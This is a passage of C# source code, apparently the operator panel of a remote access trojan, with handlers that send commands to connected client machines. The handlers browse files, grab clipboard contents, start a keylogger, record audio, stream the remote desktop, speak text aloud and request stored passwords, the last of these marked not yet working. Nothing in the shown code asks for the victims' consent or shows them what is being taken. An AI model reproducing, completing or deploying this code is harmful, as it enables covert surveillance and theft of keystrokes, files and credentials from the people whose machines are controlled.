                MBB = MessageBoxButtons.OK;
            else if (cbButtons.SelectedItem.Equals("OK Cancel"))
                MBB = MessageBoxButtons.OKCancel;
            else if (cbButtons.SelectedItem.Equals("Retry Cancel"))
                MBB = MessageBoxButtons.RetryCancel;
            else if (cbButtons.SelectedItem.Equals("Yes No"))
                MBB = MessageBoxButtons.YesNo;
            else if (cbButtons.SelectedItem.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

            if (cbIcons.SelectedItem.Equals("Asterisk"))
                MBI = MessageBoxIcon.Asterisk;
            else if (cbIcons.SelectedItem.Equals("Error"))
                MBI = MessageBoxIcon.Error;
            else if (cbIcons.SelectedItem.Equals("Exclamation"))
                MBI = MessageBoxIcon.Exclamation;
            else if (cbIcons.SelectedItem.Equals("Hand"))
                MBI = MessageBoxIcon.Hand;
            else if (cbIcons.SelectedItem.Equals("Information"))
                MBI = MessageBoxIcon.Information;
            else if (cbIcons.SelectedItem.Equals("None"))
                MBI = MessageBoxIcon.None;
            else if (cbIcons.SelectedItem.Equals("Question"))
                MBI = MessageBoxIcon.Question;
            else if (cbIcons.SelectedItem.Equals("Stop"))
                MBI = MessageBoxIcon.Stop;
            else if (cbIcons.SelectedItem.Equals("Warning")) MBI = MessageBoxIcon.Warning;

            MessageBox.Show(messageToolStripMenuItem2.Text, txtHeader.Text, MBB, MBI);

            #endregion Button & Icon conditional statements
        }

        //Open file browser and get files
        private void btnOpenFileBrowser_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            GetDirectoryFiles(ConnectionId, "BaseDirectory");
        }

        //Get files from directory
        public void GetDirectoryFiles(int ConnectionId, string Path)
        {
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetDF{" + Path + "}"));
        }

        //Get clipboard text
        private void btnGrabClipboard_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetClipboard"));
        }

        //Start keylogger
        private void btnStartKL_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartKL"));
            foreach (Keylogger KL in Application.OpenForms.OfType<Keylogger>())
                if (KL.Visible && KL.ConnectionId == ConnectionId)
                    return;

            K = new Keylogger();
            K.ConnectionId = ConnectionId;
            K.Text = "Keylogger - " + ConnectionId;
            K.Show();
        }

        //Open audio recorder
        private void btnOpenAudioRecorder_Click(object sender, EventArgs e)
        {
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            foreach (AudioRecorder AR in Application.OpenForms.OfType<AudioRecorder>())
                if (AR.Visible && AR.ConnectionID == ConnectionId)
                    return;
            AR = new AudioRecorder();
            AR.ConnectionID = ConnectionId;
            AR.Text = "Audio Recorder - " + ConnectionId;
            AR.Show();
        }

        //Send text to speech
        private void btnSendTTS_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtTTSText.Text))
            {
                MessageBox.Show("You must enter text before TTS is heard or sent.", "Error", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return;
            }

            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;

            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("[<TTS>]" + txtTTSText.Text));
        }

        //Listen to TTS before or after sending
        private void btnTTSListen_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrWhiteSpace(txtTTSText.Text))
            {
                MessageBox.Show("You must enter text before TTS is heard or sent.", "Error", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return;
            }

            using (SpeechSynthesizer Synth = new SpeechSynthesizer())
            {
                Synth.SetOutputToDefaultAudioDevice();
                Synth.Speak(txtTTSText.Text);
            }
        }

        //Get passwords from client
        private void btnGetPasswords_Click(object sender, EventArgs e)
        {
            MessageBox.Show("This feature does not work yet!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            return;
            if (lbConnectedClients.SelectedItems.Count < 0)
            {
                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            int ConnectionId = CurrentSelectedID;
            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetStoredPasswords"));
        }

        #endregion Client Functions

        #region Remote Desktop

        //Convert byte array to image
        public Image ByteArrayToImage(byte[] ByteArrayIn)
        {
            IUnsafeCodec UC = new UnsafeStreamCodec(50);
            using (var MS = new MemoryStream(ByteArrayIn))
            {
                try
                {
                    return UC.DecodeData(MS);
                }
                catch
                {
                    return null;
                }
            }
        }

        //Start remote desktop
        private void btnStartRD_Click(object sender, EventArgs e)
        {
            try
            {
                if (lbConnectedClients.SelectedItems.Count < 0)
                {
                    MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                int ConnectionId = CurrentSelectedID;
                if (RDActive)
                {
                    MessageBox.Show("Remote desktop is already active!", "Error", MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    return;
                }

                if (bwUpdateImage.IsBusy) return;
                RDActive = true;
                MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRD"));
                RDC = new RDC();
                RDC.ConnectionID = ConnectionId;
                RDC.Text = "Remote Desktop Viewer - " + ConnectionId;
                RDC.Show();
                bwUpdateImage.RunWorkerAsync();
            }
            catch { }
        }

        //Update picture box image
        private void bwUpdateImage_DoWork(object sender, DoWorkEventArgs e)
        {
            while (RDActive)
                try
                {
                    if (!RDC.Visible)
                    {
                        RDActive = false;
                        break;
                    }


                    using (Bitmap SRC = new Bitmap(ImageToDisplay))
                    {
                        Bitmap DEST = new Bitmap(RDC.pbDesktop.Width, RDC.pbDesktop.Height,
                            PixelFormat.Format32bppPArgb);
                        using (Graphics G = Graphics.FromImage(DEST))
                        {
                            G.DrawImage(SRC, new Rectangle(Point.Empty, DEST.Size));
                        }

                        if (RDC.pbDesktop.InvokeRequired)
                            RDC.pbDesktop.Invoke((MethodInvoker) delegate { RDC.pbDesktop.Image = DEST; });
                        else
                            RDC.pbDesktop.Image = DEST;
                    }

                    
                }
                catch { }
        }
   
        #endregion Remote Desktop                                               

    }
}